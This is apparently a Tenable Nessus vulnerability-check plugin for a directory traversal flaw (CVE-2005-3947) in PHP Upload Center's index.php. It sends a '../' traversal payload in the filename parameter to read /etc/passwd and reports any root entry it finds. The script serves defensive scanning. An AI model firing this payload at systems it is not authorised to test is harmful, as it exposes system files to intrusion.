#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description) {
  script_id(20402);
  script_version("$Revision: 1.14 $");

  script_cve_id("CVE-2005-3947");
  script_bugtraq_id(15621, 15626);
  script_osvdb_id(22182);

  script_name(english:"PHP Upload Center index.php filename Parameter Directory Traversal Arbitrary File Access");
  script_summary(english:"Checks for filename parameter directory traversal vulnerability in PHP Upload Center");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
directory traversal vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running PHP Upload Center, a file manager written
in PHP. 

The version of PHP Upload Center installed on the remote host fails 
to remove directory traversal sequences user input to the 'filename' 
parameter of the 'index.php' script.  An attacker can leverage this 
flaw to read arbitrary files on the remote host subject to the 
privileges of the web server user id." );
  # http://web.archive.org/web/20060329101959/http://www.blogcu.com/Liz0ziM/126975/
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?86280263" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/01/13");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/11/29");
 script_cvs_date("$Date: 2012/09/18 22:25:46 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:sergey_korostel:php_upload_center");
script_end_attributes();

 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2012 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/upload", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to exploit the flaw to read a file.
  file = "../../../../../../../../../../../../../etc/passwd";
  r = http_send_recv3(method:"GET",
    item:string(
      dir, "/index.php?",
      "action=view&",
      "filename=", file
    ), 
    port:port
  );
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if there's an entry for root.
  if (egrep(pattern:"root:.*:0:[01]:", string:res)) {
    output = strstr(res, "<font face=");
    if (output) output = strstr(output, ">");
    if (output) output = output - ">";
    if (output) output = output - strstr(output, '</font>');
    if (isnull(output)) output = res;

    report = string(
      "\n",
      output
    );

    security_warning(port:port, extra:report);
    exit(0);
  }
}
